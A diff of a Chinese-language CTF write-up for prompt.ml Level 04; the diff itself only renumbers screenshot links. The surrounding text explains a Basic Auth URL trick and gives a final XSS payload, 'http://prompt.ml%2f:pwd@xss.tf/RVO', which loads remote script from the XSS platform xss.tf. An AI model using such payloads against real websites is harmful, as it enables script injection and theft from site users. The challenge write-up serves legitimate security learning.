@@ -43,7 +43,7 @@ function escape(input) {
 
 当一个网站需要使用 Basic Auth 认证登陆时，若直接访问这个网址，会弹出类似下面这样的要求输入账密的对话框：
 
-![](http://exp-blog.com/wp-content/uploads/2019/03/dbdf1dad58fe5a92d3da8905e932693c.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2004%20-%20Basic%20Auth/imgs/01.png)
 
 Basic Auth 认证方式也允许在访问网站 `http://host `时，直接在 URL 中加上账密，格式为：
 
@@ -74,18 +74,18 @@ Basic Auth 认证方式也允许在访问网站 `http://host `时，直接在 UR
 
 由于我们构造的 Basic Auth 是无效的，所以这个输出等价于：`<script src="http://"></script>`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2004%20-%20Basic%20Auth/imgs/01.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2004%20-%20Basic%20Auth/imgs/02.png)
 
 这里我们可以利用 XSS 平台构造一个站点执行 `prompt(1)` ，然后把这个站点地址放到 `<script>` 标签即可。
 
 
 XSS 平台推荐使用 [http://xss.tf](http://xss.tf) ，新建一个项目，自定义代码为 `prompt(1)` ，得到项目地址： `http://xss.tf/RVO` （注意每个人的项目地址都是不同的）。
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2004%20-%20Basic%20Auth/imgs/02.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2004%20-%20Basic%20Auth/imgs/03.png)
 
 利用 XXS 平台的项目地址，构造最终的 payload 为：`http://prompt.ml%2f:pwd@xss.tf/RVO`
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2004%20-%20Basic%20Auth/imgs/03.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2004%20-%20Basic%20Auth/imgs/04.png)
 
 
 ------------
@@ -98,7 +98,7 @@ XSS 平台推荐使用 [http://xss.tf](http://xss.tf) ，新建一个项目，�
 
 最终**只有 Firefox 浏览器可以通过**。
 
-![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2004%20-%20Basic%20Auth/imgs/04.png)
+![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/prompt/Level%2004%20-%20Basic%20Auth/imgs/05.png)
 
 ------
 
